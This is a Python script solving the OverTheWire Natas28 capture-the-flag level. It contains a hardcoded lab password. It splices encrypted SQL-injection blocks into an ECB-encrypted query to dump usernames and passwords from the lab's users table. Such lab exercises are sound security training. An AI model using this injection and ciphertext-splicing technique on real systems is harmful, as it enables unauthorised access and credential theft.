# Natas28 python solution
# By Emil 'Dota' Bak, 2019
    # Based HEAVILY on:
    # http://alkalinesecurity.com/blog/ctf-writeups/natas-28-getting-it-wrong/

import requests
from pwn import *
from urllib import quote, unquote

# ***********************************************
URL        = "http://natas28.natas.labs.overthewire.org/"
URL_search = "http://natas28.natas.labs.overthewire.org/search.php/?query="

auth_name  = 'natas28'
auth_pass  = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# pad plaintext to ensure it takes up a full ciphertext block
DATA = dict(query="A"*10 + "B"*14)
r    = s.post(URL, data=DATA)
 
# get the raw bytes of the ciphertext
encoded_ciphertext = r.url.split("query=")[1]
ciphertext = unquote(encoded_ciphertext).decode("base64")

# sql to inject into ciphertext query
new_sql = " UNION ALL SELECT concat(username,0x3A,password) FROM users #"
 
# pad plaintext to ensure it also takes up a whole number of ciphertext blocks
plaintext = "A"*10 + new_sql + "B"*(16-(len(new_sql)%16))

DATA = dict(query=plaintext)
r    = s.post(URL, data=DATA)
 
encoded_new_ciphertext = r.url.split("query=")[1]
new_ciphertext = unquote(encoded_new_ciphertext).decode("base64")

offset = 48 + len(plaintext)-10
encrypted_sql = new_ciphertext[48:offset]
 
#add the encrypted new sql into the final ciphertext
final_ciphertext = ciphertext[:64]+encrypted_sql+ciphertext[64:]

PARAMS = dict(query=final_ciphertext.encode("base64"))
r = s.get(URL_search, params=PARAMS)

for x in r.iter_lines():
    if "natas29" in x:
        print x
